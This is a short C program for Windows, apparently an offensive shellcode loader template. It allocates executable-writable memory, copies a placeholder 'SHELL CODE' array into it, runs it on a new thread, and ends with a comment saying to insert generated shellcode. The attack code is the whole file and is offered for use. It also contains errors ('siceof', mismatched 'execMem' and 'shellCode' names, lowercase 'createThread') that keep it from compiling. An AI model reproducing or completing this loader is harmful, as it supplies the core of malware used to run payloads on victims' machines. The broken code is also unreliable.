#include <windows.h> //Windows API header file
#include <stdio.h>

int main(){
    char shellCode[] = {
        "SHELL CODE"
        "SHELL CODE"
    };
    int shellCode_size = siceof(shellCode);
    void *execMemm; //Pointer to allocated shellcode memory address
    printf("Shellcode variable address: 0x%p \n", shellcode);
    
    execMem = VirtualAlloc(NULL,//Memory Addr: NULL (system decides where to allocate)
        shellCode_size,     //dwSize: Allocated size needed
        MEM_COMMIT | MEM_RESERVE,     //flAllocationType
        PAGE_EXECUTE_READWRITE);    //flProtect: R&W Priviledges
    printf("! Memory address of execMem region: 0x%p \n", execMem);
    
    /* Move shellcode to allocated memor buffer */
    RtlMoveMemory(execMem, shellCode, shellCode_size); //dest, src, length
    
    createThread(NULL, //Security attribute structure pointer
        0, //size of stack, system makes size of executable the size of the stack
        (LPTHREAD_START_ROUTINE)execMem, //point to shellcode memory location
        NULL,
        0, //start thread immediately
        NULL); //thread ID
    
    Sleep(1000); //sleep for 1s
    return 0;
}

/* Replace value in shellCode char with generated shell code */
